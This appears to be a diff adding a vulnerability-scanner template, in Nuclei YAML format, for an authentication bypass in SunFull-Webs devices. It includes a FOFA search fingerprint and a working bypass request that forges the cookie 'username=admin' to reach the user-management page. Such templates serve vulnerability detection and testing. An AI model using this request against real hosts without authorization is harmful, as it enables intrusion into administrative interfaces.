@@ -1,0 +1,25 @@
+id: xunrao-tech-login-bypass
+
+info:
+  name: "SunFull-Webs 身份验证绕过漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: server="SunFull-Webs"
+      通过直接访问特定端点可触发身份验证绕过行为，系统未正确校验请求上下文中的鉴权凭证。当常规复现方式失效时，可通过手动构造Cookie头（username=admin）实现未授权访问，表明目标存在会话管理逻辑缺陷。
+  tags: SunFull-Webs
+
+http:
+- raw:
+  - |
+    GET /index.html HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: username=admin
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '用户管理'
